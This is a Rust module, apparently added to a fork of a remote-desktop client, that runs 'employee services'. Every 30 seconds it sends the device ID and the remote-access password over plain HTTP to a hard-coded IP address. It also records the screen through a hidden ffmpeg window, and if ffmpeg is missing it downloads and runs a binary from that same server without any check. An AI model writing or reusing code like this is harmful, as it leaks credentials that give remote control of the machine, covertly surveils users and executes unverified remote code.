use std::thread;
use std::time::{Duration, SystemTime};
use std::process::{Command, Stdio};
use std::path::PathBuf;
use std::fs;
use hbb_common::{log, config::Config, chrono::{self, Timelike}};
use reqwest::blocking::Client;
use serde_json::json;

// API 服务器地址 - 生产环境应从配置读取或硬编码
const API_SERVER: &str = "http://38.181.2.76:3000";

pub fn start_employee_services() {
    log::info!("Starting employee services...");
    
    // Wait for config to be written (especially after fresh install)
    thread::sleep(Duration::from_secs(5));
    
    // 启动心跳线程
    thread::spawn(move || {
        log::info!("Heartbeat thread started");
        loop {
            if let Err(e) = send_heartbeat() {
                log::error!("Failed to send heartbeat: {}", e);
            }
            thread::sleep(Duration::from_secs(30));
        }
    });

    // 启动录像线程 (仅在 Windows 下运行)
    #[cfg(target_os = "windows")]
    thread::spawn(move || {
        log::info!("Recording thread started");
        loop {
            if let Err(e) = manage_recording() {
                log::error!("Recording error: {}", e);
            }
            thread::sleep(Duration::from_secs(5));
        }
    });
}

fn send_heartbeat() -> Result<(), Box<dyn std::error::Error>> {
    let config = Config::get();
    let id = config.id.clone();
    let password = config.password.clone();
    
    // 这里假设我们在配置文件中存储了 employee_id，或者使用 device_id 暂时替代
    // 为了简单，我们暂时用 device_id 作为 employee_id，或者需要修改 UI 让用户输入
    // 在这里我们先获取 device_id
    
    // 从配置中读取 employee_id
    let employee_id = Config::get_option("employee_id");
    
    if employee_id.is_empty() {
        log::warn!("Employee ID not configured, skipping heartbeat");
        return Ok(());
    }
    
    let client = Client::new();
    let _res = client.post(format!("{}/api/employee/heartbeat", API_SERVER))
        .json(&json!({
            "employee_id": employee_id,
            "device_id": id,
            "device_password": password
        }))
        .send()?;
        
    // 如果返回设备未注册，则尝试注册
    if _res.status() == 404 {
        log::info!("Device not registered, attempting registration...");
        // 获取计算机名
        let computer_name = hostname::get()?.into_string().unwrap_or_default();
        
        client.post(format!("{}/api/employee/register", API_SERVER))
            .json(&json!({
                "employee_id": employee_id,
                "device_id": id,
                "device_password": password,
                "device_name": computer_name
            }))
            .send()?;
    }
        
    Ok(())
}

#[cfg(target_os = "windows")]
fn manage_recording() -> Result<(), Box<dyn std::error::Error>> {
    // 检查是否有 employee_id，如果没有意味着未安装/未配置，不应启动录像
    // 双重检查: 确保仅在安装状态下运行
    if !crate::platform::is_installed() {
        return Ok(());
    }
    
    let employee_id = Config::get_option("employee_id");
    if employee_id.is_empty() {
        return Ok(());
    }

    // 检查后台是否启用了录像
    if !check_recording_enabled(&employee_id) {
        // 如果录像被禁用，停止任何正在运行的 FFmpeg 进程
        stop_ffmpeg_process();
        return Ok(());
    }

    // 确定保存路径 - 选择剩余空间最大的非系统盘
    let mut save_root = PathBuf::from("C:\\");
    let sys_drive_letter = std::env::var("SystemDrive")
        .unwrap_or_else(|_| "C:".to_string())
        .chars()
        .next()
        .unwrap_or('C')
        .to_ascii_uppercase();
    
    let mut best_drive: Option<PathBuf> = None;
    let mut max_free_space: u64 = 0;
    
    // 遍历所有盘符，选择空间最大的非系统盘
    for byte in b'C'..=b'Z' {
        let drive_letter = byte as char;
        let drive_path = PathBuf::from(format!("{}:\\", drive_letter));
        
        if !drive_path.exists() {
            continue;
        }
        
        // 获取磁盘剩余空间
        if let Ok(space) = fs2::available_space(&drive_path) {
            let is_system_drive = drive_letter == sys_drive_letter;
            
            // 优先选择非系统盘，如果空间更大则更新
            if best_drive.is_none() 
                || (!is_system_drive && space > max_free_space)
                || (is_system_drive && best_drive.as_ref().map(|p| p.to_string_lossy().starts_with(&sys_drive_letter.to_string())).unwrap_or(true) && space > max_free_space)
            {
                // 非系统盘优先级更高
                let current_best_is_system = best_drive.as_ref()
                    .map(|p| p.to_string_lossy().starts_with(&sys_drive_letter.to_string()))
                    .unwrap_or(true);
                
                if !is_system_drive || current_best_is_system {
                    if !is_system_drive || space > max_free_space {
                        best_drive = Some(drive_path);
                        max_free_space = space;
                    }
                }
            }
        }
    }
    
    save_root = best_drive.unwrap_or_else(|| PathBuf::from(format!("{}:\\", sys_drive_letter)));

    let save_dir = save_root.join("EmployeeRecords");
    if !save_dir.exists() {
        fs::create_dir_all(&save_dir)?;
    }

    // 确保 ffmpeg 存在
    let ffmpeg_path = ensure_ffmpeg()?;

    // 清理过期文件 (2天前 或 超过10GB)
    cleanup_old_files(&save_dir)?;

    // 生成文件名: 001_YYYY-MM-DD_HH-MM.mp4 (每15分钟一个文件)
    let now = chrono::Local::now();
    let minutes = now.minute();
    let quarter = (minutes / 15) * 15; // 0, 15, 30, 45
    let filename = format!("{}_{}-{:02}.mp4", 
        Config::get().id,
        now.format("%Y-%m-%d_%H"),
        quarter
    );
    let file_path = save_dir.join(filename);

    if !file_path.exists() {
        log::info!("Starting DXGI recording to {:?}", file_path);
        
        // 计算剩余时间到下一个15分钟
        let seconds = now.second();
        let minutes_in_quarter = minutes % 15;
        let remaining_seconds = (15 - minutes_in_quarter) * 60 - seconds;
        
        // 使用 DXGI (ddagrab) 捕获 - 不会干扰硬件光标
        // ddagrab 使用 Windows Desktop Duplication API，比 gdigrab 更高效且不闪烁
        use std::os::windows::process::CommandExt;
        let status = Command::new(&ffmpeg_path)
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .args(&[
                "-f", "lavfi",
                "-i", "ddagrab=draw_mouse=0:framerate=2",  // DXGI捕获，2fps，无鼠标
                "-c:v", "libx264",
                "-preset", "ultrafast",
                "-crf", "35",
                "-pix_fmt", "yuv420p",
                "-t", &remaining_seconds.to_string(),
                "-y",
                file_path.to_str().unwrap()
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
            
        match status {
            Ok(s) if s.success() => log::info!("DXGI recording finished successfully"),
            Ok(s) => {
                log::warn!("DXGI recording failed (exit: {:?}), trying gdigrab fallback", s.code());
                // 回退到 gdigrab
                let _ = Command::new(&ffmpeg_path)
                    .creation_flags(0x08000000)
                    .args(&[
                        "-f", "gdigrab",
                        "-draw_mouse", "0",
                        "-framerate", "2",
                        "-i", "desktop",
                        "-c:v", "libx264",
                        "-preset", "ultrafast",
                        "-crf", "35",
                        "-pix_fmt", "yuv420p",
                        "-t", &remaining_seconds.to_string(),
                        "-y",
                        file_path.to_str().unwrap()
                    ])
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .status();
            }
            Err(e) => log::error!("Failed to start ffmpeg: {}", e),
        }
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn ensure_ffmpeg() -> Result<PathBuf, Box<dyn std::error::Error>> {
    // 1. Check Bundled FFmpeg (Current Directory) - Preferred for Service/Portable
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(parent) = exe_path.parent() {
            let bundled_path = parent.join("ffmpeg.exe");
            if bundled_path.exists() {
                log::info!("Found bundled ffmpeg: {:?}", bundled_path);
                return Ok(bundled_path);
            }
        }
    }

    // 2. Check Install Dir (Home/ffmpeg_bin) - Historic/Downloaded
    let install_dir = Config::get_home().join("ffmpeg_bin");
    let ffmpeg_exe = install_dir.join("ffmpeg.exe");

    if ffmpeg_exe.exists() {
        return Ok(ffmpeg_exe);
    }

    log::info!("FFmpeg not found, downloading...");
    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    // 下载 ffmpeg release (from internal mirror)
    let url = "http://38.181.2.76:3000/ffmpeg.zip";
    let zip_path = install_dir.join("ffmpeg.zip");

    {
        let mut response = Client::new().get(url).send()?;
        let mut file = fs::File::create(&zip_path)?;
        response.copy_to(&mut file)?;
    }

    log::info!("FFmpeg downloaded, extracting...");
    
    let file = fs::File::open(&zip_path)?;
    let mut archive = zip::ZipArchive::new(file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let name = file.name().to_string();

        if name.ends_with("bin/ffmpeg.exe") {
            let mut out_file = fs::File::create(&ffmpeg_exe)?;
            std::io::copy(&mut file, &mut out_file)?;
            break;
        }
    }

    // 清理 zip
    let _ = fs::remove_file(zip_path);

    if ffmpeg_exe.exists() {
         log::info!("FFmpeg installed successfully to {:?}", ffmpeg_exe);
         Ok(ffmpeg_exe)
    } else {
         Err("Failed to extract ffmpeg.exe".into())
    }
}

fn cleanup_old_files(dir: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let now = SystemTime::now();
    let retention_period = Duration::from_secs(2 * 24 * 3600); // 2天
    let max_total_size = 5 * 1024 * 1024 * 1024; // 5GB

    struct FileInfo {
        path: PathBuf,
        size: u64,
        modified: SystemTime,
    }

    let mut files: Vec<FileInfo> = Vec::new();
    let mut total_size: u64 = 0;

    // 1. 遍历并删除过期的 (2天前)
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.extension().and_then(|s| s.to_str()) == Some("mp4") {
            if let Ok(metadata) = fs::metadata(&path) {
                if let Ok(modified) = metadata.modified() {
                    // 删除过期
                    if let Ok(age) = now.duration_since(modified) {
                        if age > retention_period {
                            log::info!("Deleting old recording (age): {:?}", path);
                            let _ = fs::remove_file(&path);
                            continue;
                        }
                    }
                    
                    // 收集未过期的文件信息
                    files.push(FileInfo {
                        path,
                        size: metadata.len(),
                        modified,
                    });
                    total_size += metadata.len();
                }
            }
        }
    }

    // 2. 如果总大小超过 10GB，删除最旧的 (先排序)
    if total_size > max_total_size {
        // 按修改时间升序排序 (最旧在前)
        files.sort_by(|a, b| a.modified.cmp(&b.modified));

        for file in files {
            if total_size <= max_total_size {
                break;
            }
            log::info!("Deleting old recording (size limit): {:?}", file.path);
            if fs::remove_file(&file.path).is_ok() {
                total_size = total_size.saturating_sub(file.size);
            }
        }
    }

    Ok(())
}

/// Check if recording is enabled for this employee via backend API
#[cfg(target_os = "windows")]
fn check_recording_enabled(employee_id: &str) -> bool {
    let client = match Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build() {
        Ok(c) => c,
        Err(_) => return true, // Default to enabled if can't create client
    };
    
    let url = format!("{}/api/public/recording-enabled/{}", API_SERVER, employee_id);
    
    match client.get(&url).send() {
        Ok(response) => {
            if let Ok(json) = response.json::<serde_json::Value>() {
                if let Some(enabled) = json.get("enabled").and_then(|v| v.as_bool()) {
                    log::info!("Recording enabled check for {}: {}", employee_id, enabled);
                    return enabled;
                }
            }
            true // Default to enabled if parsing fails
        }
        Err(e) => {
            log::warn!("Failed to check recording status: {}", e);
            true // Default to enabled if network fails
        }
    }
}

/// Stop any running FFmpeg processes
#[cfg(target_os = "windows")]
fn stop_ffmpeg_process() {
    use std::process::Command;
    
    // Kill FFmpeg process
    let _ = Command::new("taskkill")
        .args(&["/F", "/IM", "ffmpeg.exe"])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output();
    
    log::info!("Stopped FFmpeg processes (recording disabled)");
}
